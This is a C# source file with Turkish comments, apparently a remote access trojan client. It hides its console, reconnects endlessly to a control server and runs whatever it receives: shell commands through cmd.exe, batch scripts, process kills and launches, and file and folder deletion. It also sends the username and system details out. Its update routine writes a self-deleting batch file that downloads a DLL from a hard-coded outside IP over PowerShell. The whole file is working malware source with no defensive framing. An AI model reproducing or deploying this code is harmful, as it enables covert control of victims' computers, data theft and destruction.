using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Net.WebSockets;
using System.IO;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;


class Program
{
    static string serverIp = "127.0.0.1"; // Yerel makinede test
    static int port = 5000;
    static string version = "0.2";
    static int reconnectDelayMs = 10000; // Yeniden bağlanma aralığı (10 saniye)

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern bool FreeConsole();

    private const int SW_HIDE = 0;

    static void Main(string[] args)
    {
        IntPtr consoleWindow = GetConsoleWindow();
        if (consoleWindow != IntPtr.Zero)
        {
            ShowWindow(consoleWindow, SW_HIDE); // Konsolu gizle

        }
        while (true)
        {
            try
            {
                ConnectAndRun();
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"[-] Ana döngüde hata: {ex.Message}");
                //Console.WriteLine("[-] 10 saniye sonra yeniden bağlanmaya çalışılacak...");
                Thread.Sleep(10000);
            }
        }
    }

    static void ConnectAndRun()
    {
        TcpClient client = null;
        NetworkStream stream = null;
        int reconnectAttempts = 0;

        // İlk bağlantı kurma - sınırsız deneme
        while (true)
        {
            try
            {
                reconnectAttempts++;
                // Console.WriteLine($"[*] Sunucuya bağlanmaya çalışılıyor... (Deneme {reconnectAttempts})");
                client = new TcpClient();
                client.Connect(serverIp, port);
                stream = client.GetStream();

                //   Console.WriteLine("[+] Sunucuya bağlanıldı!");
                reconnectAttempts = 0; // Başarılı bağlantıda sayacı sıfırla
                break;
            }
            catch (SocketException ex)
            {
                //Console.WriteLine($"[-] Sunucuya bağlanılamadı (Deneme {reconnectAttempts}): {ex.Message}");
                //Console.WriteLine($"[-] {reconnectDelayMs/1000} saniye sonra tekrar denenecek...");
                Thread.Sleep(reconnectDelayMs);
            }
        }

        try
        {
            // Başlangıç paketlerini gönder
            Thread.Sleep(200); // server'ın hazır olması için beklet

            PaketGonder(stream, 10002, version); // versiyonu gönder
            PaketGonder(stream, 10005, Environment.UserName); // kullanıcı adını gönder


            // Ana mesaj dinleme döngüsü
            byte[] buffer = new byte[4096];

            while (client.Connected && stream != null)
            {
                try
                {
                    int bytesCount = stream.Read(buffer, 0, buffer.Length);
                    if (bytesCount <= 4)
                    {
                        // Console.WriteLine("[-] Sunucu bağlantısı koptu.");
                        break; // Sunucu kapandıysa döngüden çık
                    }

                    int paketid = BitConverter.ToInt32(buffer, 0);
                    string mesaj = Encoding.UTF8.GetString(buffer, 4, bytesCount - 4);
                    //    Console.WriteLine($"[Paket ID: {paketid}] Mesaj: {mesaj}");

                    // Paket işleme
                    ProcessPacket(stream, paketid, mesaj);
                }
                catch (IOException ex)
                {
                    // Console.WriteLine($"[-] Bağlantı hatası: {ex.Message}");
                    break;
                }
                catch (ObjectDisposedException)
                {
                    //     Console.WriteLine("[-] Stream kapatıldı.");
                    break;
                }
                catch (Exception ex)
                {
                    //  Console.WriteLine($"[-] Mesaj okuma hatası: {ex.Message}");
                    break;
                }
            }
        }
        catch (Exception ex)
        {
            //   Console.WriteLine($"[-] Ana işlem hatası: {ex.Message}");
        }
        finally
        {
            // Kaynakları temizle
            try
            {
                stream?.Close();
                client?.Close();
            }
            catch { }
        }
    }

    static void ProcessPacket(NetworkStream stream, int paketid, string mesaj)
    {
        try
        {
            switch (paketid)
            {
                case 20000:
                    //  Console.WriteLine($"sunucudan mesajın var: {mesaj}");
                    break;
                case 20001:
                    string sonuc = Cmdcalistir(mesaj);
                    //  Console.WriteLine("CMD Komut sonucu:\n" + sonuc);
                    PaketGonder(stream, 10001, sonuc);
                    break;
                case 20002:
                    Guncelle();
                    break;
                case 20003:
                    BatScript(mesaj);
                    break;
                case 20004:
                    string test = SistemPerformansi();
                    PaketGonder(stream, 10004, test);
                    //   Console.WriteLine("Sistem bilgisi gönderildi.");
                    break;
                case 20005:
                    string dizin = mesaj;
                    string dosyalar = listele(dizin);
                    PaketGonder(stream, 10006, dosyalar);
                    //   Console.WriteLine("Dizin içeriği gönderildi: " + dizin);
                    break;
                case 20006:
                    string calısanuygulamalars = calisanuygulamalar();
                    PaketGonder(stream, 10007, calısanuygulamalars);
                    break;
                case 20007:
                    try
                    {
                        int processId = int.Parse(mesaj);
                        Process process = Process.GetProcessById(processId);
                        string processName = process.ProcessName;
                        process.Kill();

                        PaketGonder(stream, 10000, $"{mesaj} ID'li ({processName}) process kapatıldı");
                    }
                    catch (Exception ex)
                    {
                        PaketGonder(stream, 10000, $"Hata: {ex.Message}");
                    }
                    break;

                case 20008:
                    try
                    {
                        Process.Start(mesaj); // pek sağlam çalışmıyor......
                        PaketGonder(stream, 10000, $"Başlatıldı: {mesaj}");
                    }
                    catch (Exception ex)
                    {
                        PaketGonder(stream, 10000, "Hata: " + ex.Message);
                    }
                    break;
                case 20009:
                    Dosyaoluştur(mesaj); // permission sorunu olabilir....
                    break;
                case 20010:
                    Dosyasil(mesaj);
                    break;
                case 20011:
                    Klasörsil(mesaj);
                    break;
                case 20012:
                    string agBaglantilari = AgBaglantilari(); //çok fzla bilgi veriyor kısaltılmalı!!!
                  //  PaketGonder(stream, 10000, agBaglantilari);
                    break;
                default:
                    PaketGonder(stream, 10000, $"Bilinmeyen paket ID: {paketid}");
                    break;
            }
        }
        catch (Exception ex)
        {
            PaketGonder(stream, 10000, "Hata: " + ex.Message);
        }
    }

    static string Cmdcalistir(string komut)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + komut;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (Process proc = Process.Start(psi))
            {
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                if (!string.IsNullOrEmpty(error))
                {
                    return "Hata: " + error;
                }
                else
                {
                    return output;
                }
            }
        }
        catch (Exception)
        {
            throw;
        }
    }

    static void PaketGonder(NetworkStream stream, int paketid, string mesaj)
    {
        try
        {
            byte[] idBytes = BitConverter.GetBytes(paketid);
            byte[] mesajByte = Encoding.UTF8.GetBytes(mesaj);
            byte[] finalPaket = new byte[idBytes.Length + mesajByte.Length];
            Array.Copy(idBytes, 0, finalPaket, 0, idBytes.Length);
            Array.Copy(mesajByte, 0, finalPaket, idBytes.Length, mesajByte.Length);
            stream.Write(finalPaket, 0, finalPaket.Length);
            // Console.WriteLine($"[+] Paket gönderildi: ID={paketid}, Mesaj={mesaj}");
        }
        catch (Exception)
        {
            // Console.WriteLine($"[-] Paket gönderme hatası: {ex.Message}");
            throw; // Üst seviyeye hata fırlat
        }
    }

    static void Guncelle()
    {
        try
        {
            //Console.WriteLine("[+] Güncelleme işlemi başlatıldı.");

            string tempPath = Path.GetTempPath();
            string batPath = Path.Combine(tempPath, "guncelle.bat");
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string exeName = Path.GetFileName(exePath);
            string exeDir = Path.GetDirectoryName(exePath);

            string batIcerik = $@"
@echo off
chcp 65001 >nul
echo [*] Güncelleme başlatılıyor...
timeout /t 1 >nul

:: Mevcut işlemi kapat
taskkill /IM {exeName} /F >nul 2>&1
timeout /t 2 >nul

:: Dosyayı indir (HTTPS önerilir)
powershell -Command ""Invoke-WebRequest 'http://45.143.4.52:8080/test.dll' -OutFile 'test.dll' '{Path.Combine(exeDir, "test.dll")}'""

:: Yeni sürümü başlat
start """" ""{exePath}""

:: Batch dosyasını sil
del ""%~f0""";

            File.WriteAllText(batPath, batIcerik);

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = batPath,
                UseShellExecute = false,
                WorkingDirectory = exeDir
            };

            Process.Start(psi);
            Environment.Exit(0);
        }
        catch (Exception)
        {
            throw;
        }
    }

    static void BatScript(string mesaj)
    {
        try
        {
            string tempPath = Path.GetTempPath();
            string batPath = Path.Combine(tempPath, "arda.bat");
            string mk = mesaj += "\npause";

            File.WriteAllText(batPath, mk);

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = batPath,
                UseShellExecute = false,
                CreateNoWindow = false
            };

            Process.Start(psi);
            //   Console.WriteLine("[+] Bat scripti çalıştırıldı: " + batPath);
        }
        catch (Exception)
        {
            throw;
        }
    }


    static string listele(string dizin)
    {
        try
        {
            StringBuilder sb = new StringBuilder();
            if (Directory.Exists(dizin))
            {
                var dosyalar = Directory.GetFiles(dizin);
                var klasorler = Directory.GetDirectories(dizin);

                sb.AppendLine("Dosyalar:");
                foreach (var dosya in dosyalar)
                {
                    var info = new FileInfo(dosya);
                    sb.AppendLine($"{Path.GetFileName(dosya)} - Boyut: {info.Length} bayt - Oluşturulma Tarihi: {info.CreationTime}");
                }

                sb.AppendLine("Klasörler:");
                foreach (var klasor in klasorler)
                {
                    sb.AppendLine(Path.GetFileName(klasor));
                }
            }
            else
            {
                sb.AppendLine("Dizin bulunamadı: " + dizin);
            }
            return sb.ToString();
        }
        catch (Exception)
        {
            throw;
        }
    }

    static string calisanuygulamalar()
    {
        StringBuilder sb = new StringBuilder();
        Process[] processler = Process.GetProcesses();

        foreach (Process proc in processler)
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(proc.MainWindowTitle))
                {
                    sb.AppendLine($"{proc.ProcessName} (ID: {proc.Id}) - Başlık: {proc.MainWindowTitle} - Bellek: {proc.WorkingSet64 / 1024} KB");
                }
            }
            catch
            {
                throw;
            }
        }
        return sb.ToString();
    }
    static string SistemPerformansi()
    {
        try
        {
            StringBuilder sb = new StringBuilder();

            // CPU kullanımı (basit yöntem)
            string cpuName = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "").ToString();

            var startTime = DateTime.UtcNow;
            var startCpuUsage = Process.GetCurrentProcess().TotalProcessorTime;
            Thread.Sleep(1000);
            var endTime = DateTime.UtcNow;
            var endCpuUsage = Process.GetCurrentProcess().TotalProcessorTime;
            var cpuUsedMs = (endCpuUsage - startCpuUsage).TotalMilliseconds;
            var totalMsPassed = (endTime - startTime).TotalMilliseconds;
            var cpuUsageTotal = cpuUsedMs / (Environment.ProcessorCount * totalMsPassed) * 100;
            var uptime = TimeSpan.FromMilliseconds(Environment.TickCount64);


            // Bellek kullanımı
            var currentProcess = Process.GetCurrentProcess();
            var memoryUsageMB = currentProcess.WorkingSet64 / 1024 / 1024;
            var totalMemoryMB = GC.GetTotalMemory(false) / 1024 / 1024;


            // Disk kullanımı
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in drives)
            {
                if (drive.IsReady)
                {
                    double freeSpaceGB = drive.AvailableFreeSpace / (1024.0 * 1024.0 * 1024.0);
                    double totalSpaceGB = drive.TotalSize / (1024.0 * 1024.0 * 1024.0);
                    double usedSpaceGB = totalSpaceGB - freeSpaceGB;
                    double usagePercent = (usedSpaceGB / totalSpaceGB) * 100;

                    sb.AppendLine($"Disk {drive.Name}: {usedSpaceGB:F1}GB / {totalSpaceGB:F1}GB ({usagePercent:F1}%)");
                }
            }
            sb.AppendLine($"CPU Adı: {cpuName}");
            sb.AppendLine($"CPU Kullanımı: {cpuUsageTotal:F1}%");
            sb.AppendLine($"Bellek Kullanımı: {memoryUsageMB}MB");
            sb.AppendLine($"Toplam Bellek: {totalMemoryMB}MB");
            sb.AppendLine($"İşletim Sistemi: {Environment.OSVersion}\n");
            sb.AppendLine($"Makine Adı: {Environment.MachineName}");
            sb.AppendLine($"Kullanıcı Adı: {Environment.UserName}\n");
            sb.AppendLine($"Çalışma Dizini: {Environment.CurrentDirectory}");
            sb.AppendLine($"Sistem Uptime: {uptime.Days}g {uptime.Hours}s {uptime.Minutes}dk");


            return sb.ToString();
        }
        catch (Exception)
        {
            throw;
        }
    }

    /* static string AgBaglantilari()
     {
         try
         {
             StringBuilder sb = new StringBuilder();

             // Ağ arayüzleri
             NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
             foreach (NetworkInterface ni in interfaces)
             {
                 if (ni.OperationalStatus == OperationalStatus.Up)
                 {
                     IPInterfaceProperties ipProps = ni.GetIPProperties();
                     foreach (UnicastIPAddressInformation addr in ipProps.UnicastAddresses)
                     {
                         if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                         {
                             sb.AppendLine($"Ağ: {ni.Name}");
                             sb.AppendLine($"IP: {addr.Address}");
                             sb.AppendLine($"Alt Ağ: {addr.IPv4Mask}");
                             sb.AppendLine($"Hız: {ni.Speed / 1000000} Mbps");
                             sb.AppendLine("---");
                         }
                     }
                 }
             }

             // Aktif TCP bağlantıları
             sb.AppendLine("Aktif TCP Bağlantıları:");
             IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
             IPEndPoint[] tcpConnInfoArray = ipGlobalProperties.GetActiveTcpListeners();

             foreach (IPEndPoint endpoint in tcpConnInfoArray)
             {
                 sb.AppendLine($"TCP: {endpoint.Address}:{endpoint.Port}");
             }

             return sb.ToString();
         }
         catch (Exception ex)
         {
             return "Hata: " + ex.Message;
         }
     }

     static string KayitDefteriIslem(string kayitAdi, string anahtar, string deger)
     {
         try
         {
             RegistryKey key = Registry.CurrentUser.OpenSubKey($"Software\\{kayitAdi}", true);
             if (key == null)
             {
                 key = Registry.CurrentUser.CreateSubKey($"Software\\{kayitAdi}");
             }
             key.SetValue(anahtar, deger);
             return $"{kayitAdi} kayıt defteri işlemi başarılı: {anahtar} = {deger}";
         }
         catch (Exception ex)
         {
             return "Hata: " + ex.Message;
         }
     }*/

    static void Dosyaoluştur(string icerik)
    {
        try
        {
            string path = "C:\\Users\\arda64\\Desktop";
            string dosyaAdi = $"{Environment.UserName}.txt";

            File.WriteAllText(path, icerik);

        }
        catch (Exception)
        {
            // Console.WriteLine($"[-] Dosya oluşturma hatası: {ex.Message}");
            throw; // Üst seviyeye hata fırlat
        }
    }
    static void Dosyasil(string dosyaAdi)
    {
        try
        {
            string path = "C:\\Users\\arda64\\Desktop";
            string dosyaYolu = Path.Combine(path, dosyaAdi);

            if (File.Exists(dosyaYolu))
            {
                File.Delete(dosyaYolu);
                // Console.WriteLine($"[+] Dosya silindi: {dosyaYolu}");
            }
            else
            {
                Console.WriteLine($"[-] Dosya bulunamadı: {dosyaYolu}");
            }
        }
        catch (Exception)
        {
            // Console.WriteLine($"[-] Dosya silme hatası: {ex.Message}");
            throw; // Üst seviyeye hata fırlat
        }
    }

    static void Klasörsil(string klasorAdi)
    {
        try
        {
            string path = $"C:\\Users\\{Environment.UserName}\\Desktop\\{klasorAdi}";
            // string klasorYolu = Path.Combine(path, klasorAdi);

            if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
                // Console.WriteLine($"[+] Klasör silindi: {klasorYolu}");
            }
            else
            {
                Console.WriteLine($"[-] Klasör bulunamadı: {path}");
            }
        }
        catch (Exception)
        {
            // Console.WriteLine($"[-] Klasör silme hatası: {ex.Message}");
            throw; // Üst seviyeye hata fırlat
        }
    }
    static string AgBaglantilari()
{
    try
    {
        StringBuilder sb = new StringBuilder();
        NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();

        foreach (NetworkInterface ni in interfaces)
        {
            sb.AppendLine($"Ad: {ni.Name}");
            sb.AppendLine($"Tip: {ni.NetworkInterfaceType}");
            sb.AppendLine($"Durum: {ni.OperationalStatus}");

            IPInterfaceProperties ipProps = ni.GetIPProperties();
            foreach (UnicastIPAddressInformation ip in ipProps.UnicastAddresses)
            {
                if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                {
                    sb.AppendLine($"IP Adresi: {ip.Address}");
                }
            }

            sb.AppendLine(new string('-', 40));
        }

        return sb.ToString();
    }
    catch (Exception ex)
    {
        return "Ağ bağlantıları bilgisi alınırken hata oluştu: " + ex.Message;
    }
}
}